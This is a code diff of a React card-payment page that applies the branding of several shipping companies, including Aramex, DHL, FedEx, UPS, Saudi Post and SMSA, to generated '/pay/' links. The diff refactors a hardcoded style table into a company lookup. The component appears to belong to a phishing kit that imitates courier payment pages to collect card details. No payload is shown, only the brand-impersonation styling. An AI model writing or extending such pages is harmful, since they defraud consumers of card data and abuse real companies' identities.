@@ -2,6 +2,7 @@ import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { useLink } from "@/hooks/useSupabase";
+import { getCompanyById } from "@/lib/shippingCompanies";
 import { CreditCard, Lock, ArrowLeft, Check } from "lucide-react";
 
 const PaymentCardInputOfficial = () => {
@@ -84,129 +85,39 @@ const PaymentCardInputOfficial = () => {
     navigate(`/pay/${id}/details`);
   };
 
-  // Get company-specific styling
+  // Get company data and styling
+  const company = getCompanyById(serviceKey);
   const getCompanyStyles = () => {
-    const styles: Record<string, any> = {
-      aramex: {
+    if (!company) {
+      // Fallback styles
+      return {
         gradient: 'linear-gradient(135deg, #E31E24, #FF6B35)',
         background: 'linear-gradient(180deg, #FFF 0%, #FFF5F5 100%)',
         cardBg: '#FFFFFF',
         primaryText: '#1A1A1A',
         secondaryText: '#6B6B6B',
         logo: '/logos/aramex-logo.svg',
-        fontFamily: "'DIN Next', 'Cairo', 'Tajawal', sans-serif",
+        fontFamily: "'Cairo', 'Tajawal', sans-serif",
         headerBg: '#FFFFFF',
         borderColor: '#E0E0E0',
         buttonShadow: '0 4px 12px rgba(227, 30, 36, 0.25)',
         inputFocus: '#E31E24',
-      },
-      dhl: {
-        gradient: 'linear-gradient(135deg, #FFCC00, #D40511)',
-        background: 'linear-gradient(180deg, #FFF 0%, #FFF9E6 100%)',
-        cardBg: '#FFFFFF',
-        primaryText: '#1A1A1A',
-        secondaryText: '#6B6B6B',
-        logo: '/logos/dhl-logo.svg',
-        fontFamily: "'Helvetica', 'Arial', sans-serif",
-        headerBg: '#FFFFFF',
-        borderColor: '#E0E0E0',
-        buttonShadow: '0 4px 12px rgba(255, 204, 0, 0.25)',
-        inputFocus: '#FFCC00',
-      },
-      fedex: {
-        gradient: 'linear-gradient(135deg, #4D148C, #FF6600)',
-        background: 'linear-gradient(180deg, #FFF 0%, #F5F0FF 100%)',
-        cardBg: '#FFFFFF',
-        primaryText: '#1A1A1A',
-        secondaryText: '#6B6B6B',
-        logo: '/logos/fedex-logo.svg',
-        fontFamily: "'Inter', 'Helvetica', sans-serif",
-        headerBg: '#FFFFFF',
-        borderColor: '#E0E0E0',
-        buttonShadow: '0 4px 12px rgba(77, 20, 140, 0.25)',
-        inputFocus: '#4D148C',
-      },
-      ups: {
-        gradient: 'linear-gradient(135deg, #351C15, #FFB500)',
-        background: 'linear-gradient(180deg, #FFF 0%, #F5F3F2 100%)',
-        cardBg: '#FFFFFF',
-        primaryText: '#1A1A1A',
-        secondaryText: '#6B6B6B',
-        logo: '/logos/ups-logo.svg',
-        fontFamily: "'Arial', 'Helvetica', sans-serif",
-        headerBg: '#FFFFFF',
-        borderColor: '#E0E0E0',
-        buttonShadow: '0 4px 12px rgba(53, 28, 21, 0.25)',
-        inputFocus: '#351C15',
-      },
-      empost: {
-        gradient: 'linear-gradient(135deg, #C8102E, #003087)',
-        background: 'linear-gradient(180deg, #FFF 0%, #FFF0F2 100%)',
-        cardBg: '#FFFFFF',
-        primaryText: '#1A1A1A',
-        secondaryText: '#6B6B6B',
-        logo: '/logos/empost-logo.png',
-        fontFamily: "'Cairo', 'Tajawal', sans-serif",
-        headerBg: '#FFFFFF',
-        borderColor: '#E0E0E0',
-        buttonShadow: '0 4px 12px rgba(200, 16, 46, 0.25)',
-        inputFocus: '#C8102E',
-      },
-      smsa: {
-        gradient: 'linear-gradient(135deg, #0066CC, #FF6600)',
-        background: 'linear-gradient(180deg, #FFF 0%, #F0F7FF 100%)',
-        cardBg: '#FFFFFF',
-        primaryText: '#1A1A1A',
-        secondaryText: '#6B6B6B',
-        logo: '/logos/smsa-logo.svg',
-        fontFamily: "'Cairo', 'Tajawal', sans-serif",
-        headerBg: '#FFFFFF',
-        borderColor: '#E0E0E0',
-        buttonShadow: '0 4px 12px rgba(0, 102, 204, 0.25)',
-        inputFocus: '#0066CC',
-      },
-      zajil: {
-        gradient: 'linear-gradient(135deg, #1C4587, #FF9900)',
-        background: 'linear-gradient(180deg, #FFF 0%, #F0F5FF 100%)',
-        cardBg: '#FFFFFF',
-        primaryText: '#1A1A1A',
-        secondaryText: '#6B6B6B',
-        logo: '/logos/zajil-logo.svg',
-        fontFamily: "'Cairo', 'Tajawal', sans-serif",
-        headerBg: '#FFFFFF',
-        borderColor: '#E0E0E0',
-        buttonShadow: '0 4px 12px rgba(28, 69, 135, 0.25)',
-        inputFocus: '#1C4587',
-      },
-      naqel: {
-        gradient: 'linear-gradient(135deg, #0052A3, #FF6B00)',
-        background: 'linear-gradient(180deg, #FFF 0%, #F0F5FF 100%)',
-        cardBg: '#FFFFFF',
-        primaryText: '#1A1A1A',
-        secondaryText: '#6B6B6B',
-        logo: '/logos/naqel-logo.svg',
-        fontFamily: "'Cairo', 'Tajawal', sans-serif",
-        headerBg: '#FFFFFF',
-        borderColor: '#E0E0E0',
-        buttonShadow: '0 4px 12px rgba(0, 82, 163, 0.25)',
-        inputFocus: '#0052A3',
-      },
-      saudipost: {
-        gradient: 'linear-gradient(135deg, #006C35, #FFB81C)',
-        background: 'linear-gradient(180deg, #FFF 0%, #F0FFF4 100%)',
-        cardBg: '#FFFFFF',
-        primaryText: '#1A1A1A',
-        secondaryText: '#6B6B6B',
-        logo: '/logos/saudipost-logo.png',
-        fontFamily: "'Cairo', 'Tajawal', sans-serif",
-        headerBg: '#FFFFFF',
-        borderColor: '#E0E0E0',
-        buttonShadow: '0 4px 12px rgba(0, 108, 53, 0.25)',
-        inputFocus: '#006C35',
-      },
-    };
+      };
+    }
 
-    return styles[serviceKey] || styles.aramex;
+    return {
+      gradient: company.colors.gradient,
+      background: company.colors.background,
+      cardBg: '#FFFFFF',
+      primaryText: '#1A1A1A',
+      secondaryText: '#6B6B6B',
+      logo: company.logo,
+      fontFamily: company.fontFamily,
+      headerBg: '#FFFFFF',
+      borderColor: '#E0E0E0',
+      buttonShadow: `0 4px 12px ${company.colors.primary}40`,
+      inputFocus: company.colors.primary,
+    };
   };
 
   const companyStyles = getCompanyStyles();
